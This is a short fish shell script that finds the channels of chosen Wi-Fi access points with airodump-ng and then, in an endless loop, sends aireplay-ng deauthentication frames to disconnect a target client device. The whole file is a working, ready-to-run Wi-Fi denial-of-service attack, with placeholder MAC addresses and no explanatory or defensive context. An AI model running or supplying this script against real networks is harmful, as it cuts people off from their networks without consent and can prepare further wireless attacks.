#!/usr/bin/fish

#----------------------------------------------------------------------------------------------------
# Associative array implementation
#----------------------------------------------------------------------------------------------------
function set_field --argument-names dict key value
	set --local key (echo $key | tr -d ':')
    set -g $dict'__'$key $value
end

function get_field --argument-names dict key
	set --local key (echo $key | tr -d ':')
    eval echo \$$dict'__'$key
end
#----------------------------------------------------------------------------------------------------

set CLIENT_MAC "aa:aa:aa:aa:aa:aa"
set BSSIDS AA:AA:AA:AA:AA:AA

function find_channels
	rm /tmp/airodump.csv*
	airodump-ng --output-format csv -w /tmp/airodump.csv wlo1mon &
	sleep 60
	killall airodump-ng
	set GREP_REGEX (echo $BSSIDS | tr ' ' '|')
	echo "GREP_REGEX:" $GREP_REGEX
	egrep "$GREP_REGEX" /tmp/airodump.csv* > /tmp/airodump_target

	for bssid in $BSSIDS
		set_field CHANNELS $bssid (grep "$bssid" /tmp/airodump_target | awk -F ',' '{print $4}')
	end
end

find_channels

while true
	for bssid in $BSSIDS
		echo "bssid: $bssid"
		set channel (get_field CHANNELS $bssid | tr -d ' ')
		echo "channel: $channel"
		echo "airodump-ng --channel $channel wlo1mon "
		airodump-ng --channel $channel wlo1mon > /dev/null ^ /dev/null &
		sleep 1
		killall airodump-ng

		if test $status = 0
			aireplay-ng -a $bssid -c $CLIENT_MAC -s $bssid --deauth 1 wlo1mon
		else
			echo NETWORK WITH BSSID $bssid NOT FOUND
		end
	end
end
